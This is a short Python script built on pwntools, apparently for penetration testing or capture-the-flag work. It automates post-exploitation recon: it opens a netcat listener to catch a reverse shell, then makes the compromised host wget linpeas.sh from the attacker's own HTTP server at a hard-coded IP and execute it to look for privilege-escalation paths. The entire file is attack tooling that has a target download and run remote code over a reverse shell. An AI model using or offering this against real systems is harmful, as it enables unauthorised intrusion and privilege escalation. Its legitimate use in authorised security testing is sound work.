import os
from pwn import *
import argparse
import random
import threading, time
from datetime import datetime


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--port", help="The port to connect to", type=int, default=4444)
    parser.add_argument("-lp", "--lport", help="The port to connect to", type=int, default=9001)
    parser.add_argument("-o", "--os", help="The OS to test for", type=str, default="Linux")
    args = parser.parse_args()
    return args


def reverse_shell_recon(tmp_dir, port, current_os, lport, ip):
    p = process("/bin/bash")  # Spawns a process
    p.sendline(f"nc -lvnp {port}")

    needle = "connect to"
    # Wait for needle to appear in the output
    p.recvuntil(needle)

    if os.path.exists("./linpeas.sh"):
        print("The file exists")
        p.sendline(f"mkdir {tmp_dir}")
        # Sleep for 1 second to make sure the directory is created
        time.sleep(1)
        p.sendline(f"wget http://{ip}:{lport}/linpeas.sh -O {tmp_dir}/linpeas.sh")
        p.sendline(f"chmod +x {tmp_dir}/linpeas.sh")
        p.sendline(f"cd {tmp_dir}")
        p.sendline(f"./linpeas.sh > linpeas.txt")
        # Save the output of the linpeas script
        p.sendline(f"cat linpeas.txt")
    else:
        print("The file doesn't exist")
        # p.sendline("wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh")
        # p.sendline("cat linpeas.sh")

    time.sleep(5)


def file_server(lport):
    p = process("/bin/bash")
    p.sendline(f"python3 -m http.server {lport}")


def main():
    tmp_dir = "/tmp/" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
    print(tmp_dir)
    args = parse_args()

    lport = args.lport
    current_os = args.os
    port = args.port
    ip = "192.168.1.7"

    # 1. Spawn the reverse shell recon thread
    threading.Thread(target=reverse_shell_recon, args=(tmp_dir, port, current_os, lport, ip)).start()
    # 2. Spawn the file server thread
    threading.Thread(target=file_server, args=(lport,)).start()


if __name__ == "__main__":
    main()

